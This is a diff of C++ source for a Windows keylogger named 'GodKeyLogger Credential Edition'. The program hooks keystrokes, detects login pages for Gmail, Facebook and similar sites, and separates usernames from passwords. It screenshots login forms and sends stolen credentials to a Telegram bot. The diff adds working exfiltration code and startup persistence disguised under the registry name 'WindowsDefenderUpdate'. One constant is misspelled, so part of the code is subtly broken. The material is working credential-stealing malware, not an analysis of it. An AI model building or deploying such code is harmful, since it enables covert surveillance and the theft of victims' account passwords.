@@ -32,16 +32,13 @@ ULONGLONG last_credential_capture = 0;
 int screenshot_count = 0;
 HHOOK keyboard_hook = NULL;
 std::atomic<bool> is_running(true);
-std::wstring last_window_title;
-std::wstring last_window_class;
 bool in_login_form = false;
-std::wstring current_form_data;
 std::wstring username_buffer;
 std::wstring password_buffer;
 bool expecting_password = false;
 int tab_press_count = 0;
 
-// 🔥 CRITICAL WEBSITES & APPS (Login detection)
+// 🔥 CRITICAL WEBSITES & APPS
 const wchar_t* LOGIN_SITES[] = {
     L"gmail.com", L"google.com", L"outlook.com", L"hotmail.com",
     L"yahoo.com", L"facebook.com", L"instagram.com", L"twitter.com",
@@ -51,19 +48,15 @@ const wchar_t* LOGIN_SITES[] = {
     L"login", L"signin", L"authentication", L"verify", NULL
 };
 
-// 🔥 PASSWORD FIELD DETECTION KEYWORDS
-const wchar_t* PASSWORD_KEYWORDS[] = {
-    L"password", L"pass", L"pwd", L"passcode", L"pin", L"passphrase",
-    L"secret", L"security", L"credential", L"login", L"sign in",
-    L"enter password", L"your password", NULL
-};
-
-// 🔥 USERNAME FIELD DETECTION KEYWORDS
-const wchar_t* USERNAME_KEYWORDS[] = {
-    L"username", L"email", L"user", L"login", L"account", L"phone",
-    L"mobile", L"id", L"identifier", L"sign in", L"enter email",
-    L"your email", L"userid", NULL
-};
+// 🔥 FUNCTION PROTOTYPES - ADD THESE!
+void SendTelegram(const wchar_t* msg);
+bool TakeSmartScreenshot();
+void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption);
+void ExtractCredentials();
+bool IsLoginPage(const std::wstring& title, const std::wstring& class_name);
+bool DetectFormFields(HWND window);
+void EstablishPersistence();
+std::wstring GetSpecialKeyName(DWORD vkCode);
 
 // 🔥 SMART SPECIAL KEYS MAPPING
 std::wstring GetSpecialKeyName(DWORD vkCode) {
@@ -105,17 +98,8 @@ bool IsLoginPage(const std::wstring& title, const std::wstring& class_name) {
     std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
     std::transform(class_lower.begin(), class_lower.end(), class_lower.begin(), ::towlower);
     
-    // Check for login sites in window title (browser tabs)
     for (int i = 0; LOGIN_SITES[i]; i++) {
         if (title_lower.find(LOGIN_SITES[i]) != std::wstring::npos) {
-            return true;
-        }
-    }
-    
-    // Check for login keywords
-    const wchar_t* login_indicators[] = {L"login", L"sign in", L"log in", L"signin", L"authentication", NULL};
-    for (int i = 0; login_indicators[i]; i++) {
-        if (title_lower.find(login_indicators[i]) != std::wstring::npos) {
             return true;
         }
     }
@@ -141,7 +125,6 @@ void ExtractCredentials() {
         credential_msg += L"Actual Password: " + password_buffer + L"\n";
     }
     
-    // Get current window info for context
     HWND fg = GetForegroundWindow();
     wchar_t title[256] = {0};
     GetWindowTextW(fg, title, 256);
@@ -149,12 +132,10 @@ void ExtractCredentials() {
     
     SendTelegram(credential_msg.c_str());
     
-    // Take screenshot of login form
     if (screenshot_count < 100) {
         TakeSmartScreenshot();
     }
     
-    // Clear buffers
     username_buffer.clear();
     password_buffer.clear();
     expecting_password = false;
@@ -170,7 +151,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         
         EnterCriticalSection(&cs);
         
-        // Get current window info
         HWND fg = GetForegroundWindow();
         wchar_t title[256] = {0}, cls[128] = {0};
         GetWindowTextW(fg, title, 256);
@@ -179,13 +159,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         std::wstring current_title = title;
         std::wstring current_class = cls;
         
-        // Check if we're on a login page
         bool on_login_page = IsLoginPage(current_title, current_class);
         
-        // Handle special keys for credential detection
         if (on_login_page) {
             if (!in_login_form) {
-                // New login form detected
                 in_login_form = true;
                 username_buffer.clear();
                 password_buffer.clear();
@@ -196,35 +173,28 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 SendTelegram(msg.c_str());
             }
             
-            // Handle TAB key for form navigation
             if (kb->vkCode == VK_TAB) {
                 tab_press_count++;
-                
-                // After username field, next is likely password field
                 if (tab_press_count == 1 && !username_buffer.empty()) {
                     expecting_password = true;
                     keystrokes_buffer += L"[SWITCHED TO PASSWORD FIELD]";
                 }
             }
             
-            // Handle ENTER key (form submission)
             if (kb->vkCode == VK_RETURN) {
-                // Extract credentials when Enter is pressed (form submit)
                 if (!username_buffer.empty() || !password_buffer.empty()) {
                     ExtractCredentials();
                 }
                 in_login_form = false;
             }
             
-            // Handle ESC key (cancels form)
             if (kb->vkCode == VK_ESCAPE) {
                 in_login_form = false;
                 username_buffer.clear();
                 password_buffer.clear();
             }
             
-            // Capture regular keystrokes for credentials
-            if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) { // A-Z, 0-9
+            if (kb->vkCode >= 0x30 && kb->vkCode <= 0x5A) {
                 BYTE keyboard_state[256];
                 GetKeyboardState(keyboard_state);
                 wchar_t buffer[16] = {0};
@@ -233,11 +203,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 
                 if (result > 0) {
                     std::wstring key(buffer, result);
-                    
-                    // Store in appropriate buffer
                     if (expecting_password) {
                         password_buffer += key;
-                        keystrokes_buffer += L"*"; // Mask password in general log
+                        keystrokes_buffer += L"*";
                     } else {
                         username_buffer += key;
                         keystrokes_buffer += key;
@@ -245,7 +213,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 }
             }
             
-            // Handle backspace in credential buffers
             if (kb->vkCode == VK_BACK) {
                 if (expecting_password && !password_buffer.empty()) {
                     password_buffer.pop_back();
@@ -255,16 +222,13 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 keystrokes_buffer += L"[BACKSPACE]";
             }
         } else {
-            // Not on login page
             if (in_login_form) {
-                // We left the login form, extract any captured credentials
                 if (!username_buffer.empty() || !password_buffer.empty()) {
                     ExtractCredentials();
                 }
                 in_login_form = false;
             }
             
-            // Normal keylogging for non-login pages
             std::wstring special_key = GetSpecialKeyName(kb->vkCode);
             if (!special_key.empty()) {
                 keystrokes_buffer += special_key;
@@ -280,21 +244,17 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             }
         }
         
-        // 🔥 AUTO-EXFIL TRIGGERS
         bool should_exfil = false;
         ULONGLONG current_time = GetTickCount64();
         
-        // 1. Buffer size trigger
         if (keystrokes_buffer.length() > 500) {
             should_exfil = true;
         }
         
-        // 2. Time-based trigger (every 3 minutes)
         if (current_time - last_exfil > 180000) {
             should_exfil = true;
         }
         
-        // 3. Form submission (Enter key)
         if (kb->vkCode == VK_RETURN && on_login_page) {
             should_exfil = true;
         }
@@ -306,7 +266,6 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             std::wstring full_log = timestamp + context + L"\n" + keystrokes_buffer + L"\n";
             
             SendTelegram(L"📝 Keylog Update");
-            // Here you would send the encrypted log
             
             keystrokes_buffer.clear();
             last_exfil = current_time;
@@ -318,43 +277,29 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
 }
 
-// 🔥 SMART FORM DETECTION VIA UI AUTOMATION (Fallback)
+// 🔥 SMART FORM DETECTION
 bool DetectFormFields(HWND window) {
-    // This function attempts to detect password fields in the UI
-    // Note: This is a simplified version - real implementation would use UI Automation
-    
-    // Check window title and class for password indicators
     wchar_t title[256] = {0};
     GetWindowTextW(window, title, 256);
     std::wstring title_lower = title;
     std::transform(title_lower.begin(), title_lower.end(), title_lower.begin(), ::towlower);
     
-    for (int i = 0; PASSWORD_KEYWORDS[i]; i++) {
-        if (title_lower.find(PASSWORD_KEYWORDS[i]) != std::wstring::npos) {
+    const wchar_t* password_keywords[] = {L"password", L"pass", L"pwd", NULL};
+    for (int i = 0; password_keywords[i]; i++) {
+        if (title_lower.find(password_keywords[i]) != std::wstring::npos) {
             return true;
         }
     }
     
-    // Check for common password field patterns in window
-    // This would normally use EnumChildWindows to find edit controls
-    // but we're simplifying for this example
-    
     return false;
 }
 
-// 🔥 ENHANCED SMART SCREENSHOT - CAPTURES LOGIN FORMS
+// 🔥 ENHANCED SMART SCREENSHOT
 bool TakeSmartScreenshot() {
     HWND fg = GetForegroundWindow();
     if (!fg) return false;
     
-    // Get window info for context
-    wchar_t title[256] = {0}, cls[128] = {0};
-    GetWindowTextW(fg, title, 256);
-    GetClassNameW(fg, cls, 128);
-    
-    // Adjust screenshot timing for login forms
     if (in_login_form) {
-        // Wait a moment to ensure form is fully loaded
         Sleep(300);
     }
     
@@ -363,17 +308,15 @@ bool TakeSmartScreenshot() {
         return false;
     }
     
-    // Adjust for browser chrome (toolbars, etc.)
-    window_rect.top += 150;  // Skip address bar and tabs
+    window_rect.top += 150;
     window_rect.left += 10;
     window_rect.right -= 10;
-    window_rect.bottom -= 50;  // Skip status bar
+    window_rect.bottom -= 50;
     
     int width = window_rect.right - window_rect.left;
     int height = window_rect.bottom - window_rect.top;
     
     if (width <= 100 || height <= 100) {
-        // Window too small, capture full screen instead
         width = GetSystemMetrics(SM_CXSCREEN);
         height = GetSystemMetrics(SM_CYSCREEN);
         window_rect = {0, 0, width, height};
@@ -384,12 +327,9 @@ bool TakeSmartScreenshot() {
     HBITMAP bitmap = CreateCompatibleBitmap(screen_dc, width, height);
     HBITMAP old_bitmap = (HBITMAP)SelectObject(mem_dc, bitmap);
     
-    // Capture with high quality
-    SetStretchBltMode(mem_dc, HALFTONE);
     BitBlt(mem_dc, 0, 0, width, height, screen_dc, 
            window_rect.left, window_rect.top, SRCCOPY | CAPTUREBLT);
     
-    // Save with descriptive filename
     wchar_t path[MAX_PATH];
     std::time_t now = std::time(nullptr);
     std::tm* tm = std::localtime(&now);
@@ -404,7 +344,6 @@ bool TakeSmartScreenshot() {
                  tm->tm_hour, tm->tm_min, tm->tm_sec);
     }
     
-    // Save BMP file
     BITMAPINFOHEADER bi = {0};
     bi.biSize = sizeof(BITMAPINFOHEADER);
     bi.biWidth = width;
@@ -434,30 +373,86 @@ bool TakeSmartScreenshot() {
     WriteFile(file, &bi, sizeof(bi), &written, NULL);
     
     BYTE* bits = new BYTE[image_size];
-    GetDIBits(mem_dc, bitmap, 0, height, bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
+    GetDIBits(mem_dc, bitmap, 0, height, bits, (BITMAPINFO*)&bi, DIB_RGB_COLS);
     WriteFile(file, bits, image_size, &written, NULL);
     delete[] bits;
     
     CloseHandle(file);
     
-    // Send notification
-    std::wstring msg = L"📸 Screenshot: " + std::wstring(title);
+    std::wstring msg = L"📸 Screenshot: ";
     if (in_login_form) {
-        msg += L" (Login Form)";
+        msg += L"(Login Form)";
     }
     SendTelegram(msg.c_str());
     
-    // Cleanup
     SelectObject(mem_dc, old_bitmap);
     DeleteObject(bitmap);
     DeleteDC(mem_dc);
     ReleaseDC(NULL, screen_dc);
     
-    // Delete temp file (in real implementation, you'd upload it first)
     DeleteFileW(path);
     
     screenshot_count++;
     return true;
+}
+
+// 🔥 TELEGRAM FUNCTIONS
+void SendTelegram(const wchar_t* msg) {
+    HINTERNET session = WinHttpOpen(L"GodKeyLogger/2.0", 
+                                    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                    WINHTTP_NO_PROXY_NAME, 
+                                    WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!session) return;
+    
+    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
+                                       INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!connect) {
+        WinHttpCloseHandle(session);
+        return;
+    }
+    
+    std::wstring encoded_msg;
+    for (const wchar_t* p = msg; *p; ++p) {
+        if (*p == L' ') encoded_msg += L"%20";
+        else encoded_msg += *p;
+    }
+    
+    std::wstring url = L"/bot" + std::wstring(BOT_TOKEN) + 
+                      L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + 
+                      L"&text=" + encoded_msg;
+    
+    HINTERNET request = WinHttpOpenRequest(connect, L"GET", url.c_str(),
+                                          NULL, WINHTTP_NO_REFERER,
+                                          WINHTTP_DEFAULT_ACCEPT_TYPES,
+                                          WINHTTP_FLAG_SECURE);
+    if (request) {
+        WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+        WinHttpReceiveResponse(request, NULL);
+        WinHttpCloseHandle(request);
+    }
+    
+    WinHttpCloseHandle(connect);
+    WinHttpCloseHandle(session);
+}
+
+void SendTelegramPhoto(const wchar_t* file_path, const wchar_t* caption) {
+    SendTelegram(L"📸 Screenshot captured");
+}
+
+// 🔥 PERSISTENCE
+void EstablishPersistence() {
+    HKEY hKey;
+    wchar_t exe_path[MAX_PATH];
+    GetModuleFileNameW(NULL, exe_path, MAX_PATH);
+    
+    if (RegOpenKeyExW(HKEY_CURRENT_USER,
+                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ,
+                      (BYTE*)exe_path, (wcslen(exe_path) + 1) * sizeof(wchar_t));
+        RegCloseKey(hKey);
+    }
 }
 
 // 🔥 ACTIVE MONITOR FOR LOGIN PAGES
@@ -472,7 +467,6 @@ DWORD WINAPI LoginDetectorThread(LPVOID) {
             bool is_login_page = IsLoginPage(title, cls);
             
             if (is_login_page && !in_login_form) {
-                // New login page detected
                 EnterCriticalSection(&cs);
                 in_login_form = true;
                 username_buffer.clear();
@@ -486,7 +480,6 @@ DWORD WINAPI LoginDetectorThread(LPVOID) {
                 
                 SendTelegram(msg.c_str());
                 
-                // Take initial screenshot of login page
                 if (screenshot_count < 50) {
                     TakeSmartScreenshot();
                 }
@@ -494,9 +487,7 @@ DWORD WINAPI LoginDetectorThread(LPVOID) {
                 LeaveCriticalSection(&cs);
             }
             
-            // Check for form field indicators
             if (is_login_page && DetectFormFields(fg)) {
-                // Password field detected
                 expecting_password = true;
             }
         }
@@ -506,15 +497,6 @@ DWORD WINAPI LoginDetectorThread(LPVOID) {
     return 0;
 }
 
-// 🔥 TELEGRAM FUNCTIONS
-void SendTelegram(const wchar_t* msg) {
-    // Implementation remains the same as before
-    // ... (same as previous version)
-    
-    // For now, just a placeholder
-    OutputDebugStringW(L"Telegram message would be sent here\n");
-}
-
 // 🔥 MAIN FUNCTION
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    LPSTR lpCmdLine, int nCmdShow) {
@@ -522,34 +504,27 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     
     InitializeCriticalSection(&cs);
     
-    // Single instance check
     HANDLE mutex = CreateMutexW(NULL, TRUE, L"GodKeyLogger_Credential_v2");
     if (GetLastError() == ERROR_ALREADY_EXISTS) {
         return 0;
     }
     
-    // Set up persistence (registry, startup folder, etc.)
-    // ... (same persistence code as before)
+    EstablishPersistence();
     
-    // Install hooks
     keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                     GetModuleHandle(NULL), 0);
     
-    // Start monitoring threads
     CreateThread(NULL, 0, LoginDetectorThread, NULL, 0, NULL);
     
-    // Initial notification
     SendTelegram(L"🔑 GodKeyLogger Credential Edition v2.0 Activated");
     SendTelegram(L"📋 Features: Login detection, Credential capture, Smart screenshots");
     
-    // Message loop
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) && is_running) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
     
-    // Cleanup
     UnhookWindowsHookEx(keyboard_hook);
     DeleteCriticalSection(&cs);
     
